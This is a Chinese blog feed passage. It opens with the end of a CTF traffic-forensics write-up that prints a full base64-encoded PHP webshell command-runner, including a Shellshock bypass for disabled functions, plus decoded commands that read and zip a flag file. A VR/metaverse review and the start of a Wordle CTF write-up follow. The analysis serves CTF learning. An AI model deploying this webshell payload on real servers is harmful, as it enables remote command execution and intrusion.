base64_decode(<span class="keyword">substr</span>($_POST[<span class="string">&quot;g479cf6f058cf8&quot;</span>], <span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>因为<code>$_POST[&quot;o1faebd4ec3d97&quot;]</code>有亿点短，<br>直接先看看$s是个嘛玩意</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;head -n <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure><p>嗯哼</p><p>直接看第18个包，继续古法炮制</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line"> [<span class="string">&quot;_GET&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> [<span class="string">&quot;_POST&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">   [<span class="string">&quot;cmd&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">77</span>) <span class="string">&quot;var_dump(get_defined_vars());@eval(@base64_decode($_POST[&#x27;t14ae029df18c6&#x27;]));&quot;</span></span><br><span class="line">   [<span class="string">&quot;e57fb9c067c677&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;rX&quot;</span></span><br><span class="line">   [<span class="string">&quot;g479cf6f058cf8&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">98</span>) <span class="string">&quot;flY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0IjtoZWFkIC1uIDIgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd&quot;</span></span><br><span class="line">   [<span class="string">&quot;o1faebd4ec3d97&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">&quot;VyL2Jpbi9zaA==&quot;</span></span><br><span class="line">   [<span class="string">&quot;t14ae029df18c6&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">3492</span>) <span class="string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNjI1ZmU4Ii4iNjliNDllIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICI2M2MxZGIiLiJmMWU4MTEiO31vYl9zdGFydCgpO3RyeXskcD1iYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbIm8xZmFlYmQ0ZWMzZDk3Il0sMikpOyRzPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiZzQ3OWNmNmYwNThjZjgiXSwyKSk7JGVudnN0cj1AYmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJlNTdmYjljMDY3YzY3NyJdLDIpKTskZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JGM9c3Vic3RyKCRkLDAsMSk9PSIvIj8iLWMgXCJ7JHN9XCIiOiIvYyBcInskc31cIiI7aWYoc3Vic3RyKCRkLDAsMSk9PSIvIil7QHB1dGVudigiUEFUSD0iLmdldGVudigiUEFUSCIpLiI6L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluIik7fWVsc2V7QHB1dGVudigiUEFUSD0iLmdldGVudigiUEFUSCIpLiI7QzovV2luZG93cy9zeXN0ZW0zMjtDOi9XaW5kb3dzL1N5c1dPVzY0O0M6L1dpbmRvd3M7QzovV2luZG93cy9TeXN0ZW0zMi9XaW5kb3dzUG93ZXJTaGVsbC92MS4wLzsiKTt9aWYoIWVtcHR5KCRlbnZzdHIpKXskZW52YXJyPWV4cGxvZGUoInx8fGFzbGluZXx8fCIsICRlbnZzdHIpO2ZvcmVhY2goJGVudmFyciBhcyAkdikge2lmICghZW1wdHkoJHYpKSB7QHB1dGVudihzdHJfcmVwbGFjZSgifHx8YXNrZXl8fHwiLCAiPSIsICR2KSk7fX19JHI9InskcH0geyRjfSI7ZnVuY3Rpb24gZmUoJGYpeyRkPWV4cGxvZGUoIiwiLEBpbmlfZ2V0KCJkaXNhYmxlX2Z1bmN0aW9ucyIpKTtpZihlbXB0eSgkZCkpeyRkPWFycmF5KCk7fWVsc2V7JGQ9YXJyYXlfbWFwKCd0cmltJyxhcnJheV9tYXAoJ3N0cnRvbG93ZXInLCRkKSk7fXJldHVybihmdW5jdGlvbl9leGlzdHMoJGYpJiZpc19jYWxsYWJsZSgkZikmJiFpbl9hcnJheSgkZiwkZCkpO307ZnVuY3Rpb24gcnVuc2hlbGxzaG9jaygkZCwgJGMpIHtpZiAoc3Vic3RyKCRkLCAwLCAxKSA9PSAiLyIgJiYgZmUoJ3B1dGVudicpICYmIChmZSgnZXJyb3JfbG9nJykgfHwgZmUoJ21haWwnKSkpIHtpZiAoc3Ryc3RyKHJlYWRsaW5rKCIvYmluL3NoIiksICJiYXNoIikgIT0gRkFMU0UpIHskdG1wID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdhcycpO3B1dGVudigiUEhQX0xPTD0oKSB7IHg7IH07ICRjID4kdG1wIDI+JjEiKTtpZiAoZmUoJ2Vycm9yX2xvZycpKSB7ZXJyb3JfbG9nKCJhIiwgMSk7fSBlbHNlIHttYWlsKCJhQDEyNy4wLjAuMSIsICIiLCAiIiwgIi1idiIpO319IGVsc2Uge3JldHVybiBGYWxzZTt9JG91dHB1dCA9IEBmaWxlX2dldF9jb250ZW50cygkdG1wKTtAdW5saW5rKCR0bXApO2lmICgkb3V0cHV0ICE9ICIiKSB7cHJpbnQoJG91dHB1dCk7cmV0dXJuIFRydWU7fX1yZXR1cm4gRmFsc2U7fTtmdW5jdGlvbiBydW5jbWQoJGMpeyRyZXQ9MDskZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoZmUoJ3N5c3RlbScpKXtAc3lzdGVtKCRjLCRyZXQpO31lbHNlaWYoZmUoJ3Bhc3N0aHJ1Jykpe0BwYXNzdGhydSgkYywkcmV0KTt9ZWxzZWlmKGZlKCdzaGVsbF9leGVjJykpe3ByaW50KEBzaGVsbF9leGVjKCRjKSk7fWVsc2VpZihmZSgnZXhlYycpKXtAZXhlYygkYywkbywkcmV0KTtwcmludChqb2luKCIKIiwkbykpO31lbHNlaWYoZmUoJ3BvcGVuJykpeyRmcD1AcG9wZW4oJGMsJ3InKTt3aGlsZSghQGZlb2YoJGZwKSl7cHJpbnQoQGZnZXRzKCRmcCwyMDQ4KSk7fUBwY2xvc2UoJGZwKTt9ZWxzZWlmKGZlKCdwcm9jX29wZW4nKSl7JHAgPSBAcHJvY19vcGVuKCRjLCBhcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwgMiA9PiBhcnJheSgncGlwZScsICd3JykpLCAkaW8pO3doaWxlKCFAZmVvZigkaW9bMV0pKXtwcmludChAZmdldHMoJGlvWzFdLDIwNDgpKTt9d2hpbGUoIUBmZW9mKCRpb1syXSkpe3ByaW50KEBmZ2V0cygkaW9bMl0sMjA0OCkpO31AZmNsb3NlKCRpb1sxXSk7QGZjbG9zZSgkaW9bMl0pO0Bwcm9jX2Nsb3NlKCRwKTt9ZWxzZWlmKGZlKCdhbnRzeXN0ZW0nKSl7QGFudHN5c3RlbSgkYyk7fWVsc2VpZihydW5zaGVsbHNob2NrKCRkLCAkYykpIHtyZXR1cm4gJHJldDt9ZWxzZWlmKHN1YnN0cigkZCwwLDEpIT0iLyIgJiYgQGNsYXNzX2V4aXN0cygiQ09NIikpeyR3PW5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTskZT0kdy0+ZXhlYygkYyk7JHNvPSRlLT5TdGRPdXQoKTskcmV0Lj0kc28tPlJlYWRBbGwoKTskc2U9JGUtPlN0ZEVycigpOyRyZXQuPSRzZS0+UmVhZEFsbCgpO3ByaW50KCRyZXQpO31lbHNleyRyZXQgPSAxMjc7fXJldHVybiAkcmV0O307JHJldD1AcnVuY21kKCRyLiIgMj4mMSIpO3ByaW50ICgkcmV0IT0wKT8icmV0PXskcmV0fSI6IiI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=&quot;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>看到这熟悉格式，直接把<code>g479cf6f058cf8</code>的前两个删去然后base64</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;head -n 2 <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure><p>就这么试，然后在第20个包里找到了</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;zip -P PaSsZiPWorD flag.zip <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure><p>flag被压缩了QWQ，还是有密码的</p><p>继续分析后面的流量，在最后一个包里看到了一个压缩包文件</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eb327956PK   稀匱 <span class="number">3</span>讄X   <span class="built_in">T</span>   </span><br><span class="line">  ../flag.txtUT ?LbK6Lbux</span><br><span class="line"> ?     </span><br><span class="line">p=<span class="built_in">T</span>狶鷯<span class="built_in">T</span>?? y鰑胆帥b朘?突D腳&#123;蠥<span class="built_in">t</span>隋僌h?g&lt;O&lt;k&lt;怱???Y塚槧旚輷崉 柙綾?<span class="built_in">T</span>杒懲PK  <span class="number">3</span>讄X   <span class="built_in">T</span>   PK   稀匱 <span class="number">3</span>讄X   <span class="built_in">T</span>   </span><br><span class="line">             ../flag.txtUT ?Lbux</span><br><span class="line"> ?     PK      Q   ?    <span class="number">44</span>e71eb66</span><br></pre></td></tr></table></figure><p>掐头去尾，扔到winhex里面，然后用密码<code>PaSsZiPWorD</code>解压</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Yes</span>,this is the flag file.</span><br><span class="line"><span class="attribute">And</span> the flag is:</span><br><span class="line"><span class="attribute">DASCTF</span>&#123;f<span class="number">3</span>f<span class="number">32</span>f<span class="number">434</span>eddbc<span class="number">6</span>e<span class="number">6</span>b<span class="number">5043373</span>af<span class="number">95</span>ae<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="其他题解"><a href="#其他题解" class="headerlink" title="其他题解"></a>其他题解</h1><blockquote><p>师傅们太厉害了 Orz</p></blockquote><ul><li><h3 id="Crypto题解"><a href="#Crypto题解" class="headerlink" title="Crypto题解"></a><a href="https://4xwi11.github.io/posts/9171e9d7/">Crypto题解</a></h3></li><li><h3 id="部分Pwn题解"><a href="#部分Pwn题解" class="headerlink" title="部分Pwn题解"></a><a href="https://reurl.cc/0pOVvo">部分Pwn题解</a></h3></li><li><h3 id="部分RE题解"><a href="#部分RE题解" class="headerlink" title="部分RE题解"></a><a href="https://reurl.cc/Gxrzjp">部分RE题解</a></h3></li><li><h3 id="部分Misc题解"><a href="#部分Misc题解" class="headerlink" title="部分Misc题解"></a><a href="https://reurl.cc/Rr15Ae">部分Misc题解</a></h3></li><li><h3 id="部分Web题解"><a href="#部分Web题解" class="headerlink" title="部分Web题解"></a><a href="https://reurl.cc/Gxrzpp">部分Web题解</a></h3></li></ul><p>（完）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识元宇宙</title>
      <link href="/2022/02/23/%E5%88%9D%E8%AF%86%E5%85%83%E5%AE%87%E5%AE%99/"/>
      <url>/2022/02/23/%E5%88%9D%E8%AF%86%E5%85%83%E5%AE%87%E5%AE%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FaceBook更名为Meta，为什么？什么意思？受了什么影响？"><a href="#FaceBook更名为Meta，为什么？什么意思？受了什么影响？" class="headerlink" title="FaceBook更名为Meta，为什么？什么意思？受了什么影响？"></a>FaceBook更名为Meta，为什么？什么意思？受了什么影响？</h1><p><img src="https://s2.loli.net/2021/12/19/ywUzExheAgKlTdq.png" alt="Meta"></p><hr><h1 id="Meta-元宇宙"><a href="#Meta-元宇宙" class="headerlink" title="Meta - 元宇宙"></a>Meta - 元宇宙</h1><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220223223712875.png" alt="无限可能"></p><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><blockquote><p>元宇宙始于1992年国外科幻作品《雪崩》里提到的“Metaverse（元宇宙）”和“Avatar（化身）”这两个概念。人们在其中可以拥有自己的虚拟替身，这个虚拟的世界就叫作“元宇宙”。</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>元宇宙本身不是一种技术，而是一个理念和概念，它需要整合不同的新技术，如5G、6G、人工智能、大数据等，强调虚实相融。</p></blockquote><h2 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h2><blockquote><p>技术要求上，一来看重扩展现实技术，包括VR和AR；二是数字孪生，能够把现实世界镜像到虚拟世界里面去；三是用区块链来搭建经济体系。</p></blockquote><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><h3 id="娱乐"><a href="#娱乐" class="headerlink" title="娱乐"></a>娱乐</h3><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1uS4y1c7kC?t=1.2" frameborder="0" allowfullscreen></iframe><h3 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h3><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1KS4y1c71m?spm_id_from=333.999.0.0" frameborder="0" allowfullscreen></iframe><h2 id="议论"><a href="#议论" class="headerlink" title="议论"></a>议论</h2><blockquote><p>风口上的猪。新颖别致，韭菜利器。</p><p>但不影响展望。</p><p>因为，人们有需求。</p><p>“根据统计，大多数美国成年人每天看电视（包括流媒体）或者玩电子游戏的时间，长达几个小时。电视节目或电子游戏，本质上都是提供了一个虚拟世界，让观众和玩家脱离现实，感受到快乐。</p><p>这表明人们愿意在虚拟世界里面，每天待上几个小时，哪怕现在的体验还非常初级。”</p><p><img src="https://cdn.beekka.com/blogimg/asset/202112/bg2021120704.webp" alt="娱乐"></p><p>也因为，时代有需求。</p><p>“第二个理由是，疫情期间，许多人都在家办公。以前，上班的目的地是办公室，现在变成了键盘和显示器。</p><p>这表明，人们可以在计算机前面工作8小时。如果能够提供更好的虚拟办公条件，这8小时完全可以在虚拟空间里面度过。”</p><p><img src="https://cdn.beekka.com/blogimg/asset/202112/bg2021120705.webp" alt="办公"></p><p>每个人都自己的出发点，但技术无罪。</p></blockquote><h2 id="元宇宙的落脚点"><a href="#元宇宙的落脚点" class="headerlink" title="元宇宙的落脚点"></a>元宇宙的落脚点</h2><h3 id="Virtual-Reality"><a href="#Virtual-Reality" class="headerlink" title="Virtual Reality"></a><strong>Virtual Reality</strong></h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><blockquote><p><strong>VR</strong> 虚拟现实 英文<strong>全名</strong>為<strong>Virtual Reality</strong>，指的是电脑创造出3D的虚拟空间。</p></blockquote><h4 id="几个参数"><a href="#几个参数" class="headerlink" title="几个参数"></a>几个参数</h4><p>强调身临其境，实现元宇宙，就得看看设备参数。</p><p><strong>1、PPI</strong></p><p><img src="https://pic1.zhimg.com/80/v2-13b4250ccc335c04040cb76a22d3e25c_1440w.jpg" alt="PPI"></p><p>VR下的PPI概念与在显示器、手机、电视机等消费电子领域的概念保持一致。它指的是每英寸所拥有的像素数量，像素越多，屏显效果就越佳，因此PPI在一定程度上是决定VR画面清晰度的重要参数。</p><p><strong>2、PPD</strong></p><p><img src="https://pic3.zhimg.com/80/v2-9f51644b72deb8705c0f99571231e80a_1440w.jpg" alt="PPD"></p><p>所谓PPD指的是【Pixels Per Degree】——人眼在一度的视角内所能看到的像素数，对于VR设备而言，PPD越大越好，这也是一个与VR设备清晰的息息相关的重要参数。</p><p><strong>3、FOV</strong></p><p><img src="https://pic2.zhimg.com/80/v2-c957808b79daea6766bc0a6bcd6c1155_1440w.jpg" alt="FOV"></p><p>FOV又被称之为视场角，在VR领域下，他指的是水平方向人眼所能看到的角度，视场角越高，能够显示更多的画面内容。</p><p><strong>4、纱窗效应</strong></p><p><img src="https://pic2.zhimg.com/80/v2-f73c8e547a703c46f2f5f48438a982a9_1440w.jpg" alt="纱窗原理"></p><p>所谓纱窗效应，顾名思义，就是一种朦朦胧胧的视觉观感。这种情况一般发生在PPI比较低的VR设备上，导致人眼可以直接看到显示面板上的像素点，就像透过一层薄纱看电视的既视感，这对于用户体验来说，是非常致命的。</p><p><strong>4、自由度</strong></p><p><img src="https://pic1.zhimg.com/80/v2-8fb0c24baed71cccb8c7da3d187e6998_1440w.jpg" alt="自由度"></p><p>所谓自由度指的是转动角度的范围，在VR领域上，自由度指的是VR设备可以检测到头部向不同方向的转动程度，一般来说，VR设备有两类自由度，3Dof和6Dof，前者是指上 上下、前后和左右三个位置的位移信息；6Dof则指的是除了上 上下、前后和左右三个位置外，还能够检测到由于身体移动带来的上下前后左右等多个位置转动所带来的视野角度变化。</p><p><strong>6、Outside-In/Inside-Out</strong></p><p><img src="https://pic1.zhimg.com/80/v2-a9e6daad1446deae4f69b3022703da50_1440w.jpg" alt="示意图1"></p><p>目前市面上比较主流的定位技术。</p><p><img src="https://pic4.zhimg.com/80/v2-b1933348c5d7a169e5dabad676d0e88f_1440w.jpg" alt="示意图2"></p><p>Outside-In：外向内追踪技术，定位基站一般外置，且定位信号由集成在VR头显上的接收器接受，这是目前准确度比较高的追踪技术，而且因为传输资料量少，运算延迟也非常低，一般用在VR分体机上，实现超高精准度的定位效果，目前来看，是游玩SteamVR最合适的定位解决方案。</p><p><img src="https://pic4.zhimg.com/80/v2-8cf22f68d83aa80569752ef5c4881033_1440w.jpg" alt="示意图1"></p><p>Inside-Out：内向外追踪技术，此种技术不需要外接任何传感器，拥有比较高的自由度和比较自由的移动性，但在精度方面，略逊于Outside-In技术。</p><h4 id="实际产品"><a href="#实际产品" class="headerlink" title="实际产品"></a>实际产品</h4><p><strong>价位不太高，产品不太老。</strong></p><p>本着此原则，便入手尝试了这款VR一体机</p><h4 id="外观"><a href="#外观" class="headerlink" title="外观"></a>外观</h4><p><img src="https://s2.loli.net/2022/01/16/yt13KTZUsFoEHYI.png" alt="nolo Sonic VR一体机·外"></p><p><img src="https://pic1.zhimg.com/80/v2-f151524be76902e5c7adcfc880dc1a5e_1440w.jpg?source=1940ef5c" alt="nolo Sonic VR一体机·内"></p><h5 id="规格参数"><a href="#规格参数" class="headerlink" title="规格参数"></a>规格参数</h5><ul><li>Inside-Out定位（显然不可能买卖基站</li></ul><table><thead><tr><th>商品编号</th><th align="center">100021349516</th></tr></thead><tbody><tr><td><strong>主体</strong></td><td align="center"></td></tr><tr><td>型号</td><td align="center">Sonic VR一体机</td></tr><tr><td>连接方式</td><td align="center">蓝牙，Wi-Fi</td></tr><tr><td>双眼分辨率</td><td align="center">3840*2160</td></tr><tr><td><strong>屏幕</strong></td><td align="center"></td></tr><tr><td>刷新率</td><td align="center">72Hz</td></tr><tr><td>屏幕材质</td><td align="center">LCD</td></tr><tr><td>屏幕精细度</td><td align="center"><strong>807ppi</strong></td></tr><tr><td><strong>存储</strong></td><td align="center"></td></tr><tr><td>运行内存</td><td align="center">6GB</td></tr><tr><td>机身存储</td><td align="center">64GB</td></tr><tr><td><strong>光学设计</strong></td><td align="center"></td></tr><tr><td>视场角</td><td align="center"><strong>101度</strong></td></tr><tr><td><strong>基本信息</strong></td><td align="center"></td></tr><tr><td>机身长度</td><td align="center">195mm</td></tr><tr><td>产品净重（kg）</td><td align="center">0.462(不含头带)</td></tr><tr><td><strong>参数</strong></td><td align="center"></td></tr><tr><td>分辨率</td><td align="center"><strong>4-4.5k</strong></td></tr><tr><td>延迟率</td><td align="center">小于等于20ms</td></tr></tbody></table><h4 id="实际体验"><a href="#实际体验" class="headerlink" title="实际体验"></a>实际体验</h4><h5 id="指引教程"><a href="#指引教程" class="headerlink" title="指引教程"></a>指引教程</h5><p>没想到 双眼 4K 和 807 的PPI在指引这里就表现的淋漓极致。</p><p>手柄的线性马达也充分发挥出效果。</p><p><img src="https://pic3.zhimg.com/80/v2-6bb13076344f6de370ad6ab8449f286f_1440w.jpg?source=1940ef5c" alt="教程"></p><p><img src="https://pica.zhimg.com/80/v2-f1ba1960e956f97f00adfc83cdc18022_1440w.jpg?source=1940ef5c" alt="指引"></p><h5 id="爱奇艺"><a href="#爱奇艺" class="headerlink" title="爱奇艺"></a>爱奇艺</h5><p>模拟影院。</p><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1sY41157A5?t=0.3" frameborder="0" allowfullscreen></iframe><h5 id="B站"><a href="#B站" class="headerlink" title="B站"></a>B站</h5><p>好大的屏幕。</p><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1EY411G71k?t=0.3" frameborder="0" allowfullscreen></iframe><h5 id="乒乓球🏓️"><a href="#乒乓球🏓️" class="headerlink" title="乒乓球🏓️"></a>乒乓球🏓️</h5><p>这种视频形式，难道是想让导出者人工合并？</p><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1vU4y1Z7RX?t=0.3" frameborder="0" allowfullscreen></iframe><h5 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h5><p>实际上，串流电脑Steam后，游戏与新鲜体验将数不胜数。</p><p>值得一提，<strong>健康方面</strong>有卡路里记录、心率测试等实用的功能</p><p><img src="https://pica.zhimg.com/80/v2-433d1dac8c57b05fad64cab619b445d8_1440w.jpg" alt="心率"></p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220116134209948.png" alt="芜湖" style="zoom:90%;" /><p>感觉绚烂，对感官刺激尤其。</p><p>但说到底，它（VR一体机）目前民用的、价位适合普罗大众的也只是一个消遣。</p><p>头显的重量、散热风扇的轰鸣还是让人能清晰无比的知道自己被束缚着，技术也被束缚着。</p><p>远没到今日改名，明日建立元宇宙的程度。</p><p>作为游戏、观影、运动等项目的娱乐工具绰绰有余，但要传感多种感官的感觉，实现数字孪生、以假乱真都还只是展望，有些不切实际的那种。</p><blockquote><p>FaceBook母公司改名，是品牌重塑，是概念炒作，是有预谋的年轻化、转移危机。</p><p>而元宇宙本身，仍是一个不断演变、不断发展的概念，不同参与者也将不断丰富它的含义。</p></blockquote><h4 id="附"><a href="#附" class="headerlink" title="附"></a>附</h4><p><a href="https://www.bilibili.com/video/BV1hP4y1L7ux?p=3">扎克伯格的蓝图</a></p><p><a href="https://www.ruanyifeng.com/blog/2021/12/weekly-issue-187.html">ruanyf的展望</a></p><p><a href="https://www.bilibili.com/video/BV1aP4y1j75V?spm_id_from=333.999.0.0">黄仁勋主题演讲</a></p><p><a href="https://www-facebook-com.webvpn.nefu.edu.cn/facebookrealitylabs/videos/1264023127446649">Carmack技术分析</a></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><strong>wikipedia</strong></li><li><a href="https://www.zhihu.com/question/463293470/answer/1950712262">平昭·南宫司卿的测评</a></li><li><a href="https://zhuanlan.zhihu.com/p/413443446">大梦指南</a></li></ul><p>(完)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届TQLCTF高校赛</title>
      <link href="/2022/02/22/%E7%AC%AC%E4%B8%80%E5%B1%8ATQLCTF%E9%AB%98%E6%A0%A1%E8%B5%9B/"/>
      <url>/2022/02/22/%E7%AC%AC%E4%B8%80%E5%B1%8ATQLCTF%E9%AB%98%E6%A0%A1%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一届TQLCTF记录"><a href="#第一届TQLCTF记录" class="headerlink" title="第一届TQLCTF记录"></a>第一届TQLCTF记录</h1><h2 id="1-队伍信息"><a href="#1-队伍信息" class="headerlink" title="1. 队伍信息"></a>1. 队伍信息</h2><p>队伍名称：摸鱼即胜利<br>个人名称：hakkar0597<br>队友名称：lines<br>队伍方向分布： Crypto + Misc</p><h2 id="2-解题情况"><a href="#2-解题情况" class="headerlink" title="2. 解题情况"></a>2. 解题情况</h2><p>签到两日游</p><h2 id="3-个人反思"><a href="#3-个人反思" class="headerlink" title="3. 个人反思"></a>3. 个人反思</h2><p>客观上，题目有绝对难度，对应密码方向没出题可以理解。<br>实际上，策略还是有些失当。</p><ul><li>看到密码不知所云就过早放弃了（？结果上看好像也没错</li><li>太上头了，除了时间分配问题外🤔，对现成代码的读取、应用能力差</li><li>菜是原罪 😑</li></ul><h1 id="Wordle"><a href="#Wordle" class="headerlink" title="Wordle"></a>Wordle</h1><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p><img src="https://x0.ifengimg.com/ucms/2022_07/A5EFC9FDBEDA8CA819F2850A9189AA2E39EFFB0A_size322_w1080_h1950.png" alt="img"></p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><blockquote><p>一个 5 位英语单词谜底，玩家可以随意提交一个5字母组成英语单词，但必须是字典里有的。</p><p>每一位字母会给一个颜色反馈。</p></blockquote><ul><li><strong>绿色</strong> ：说明答案里有这个字母、所在位置也正确；</li><li><strong>黄色</strong> ：说明答案里有这个字母、但不在这个位置；</li><li><strong>灰色</strong> ：说明答案里没有这个字母。</li></ul><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>做题，看到TQLCTF·Misc·Wordle</p><p>看的我色盲犯了😵‍💫</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220222032744911.png" alt="image-20220222032744911"></p><h3 id="成分分析"><a href="#成分分析" class="headerlink" title="成分分析"></a>成分分析</h3><ul><li><p>allowed_guesses.txt</p><p>如题，内容为所有允许猜测的单词</p></li><li><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 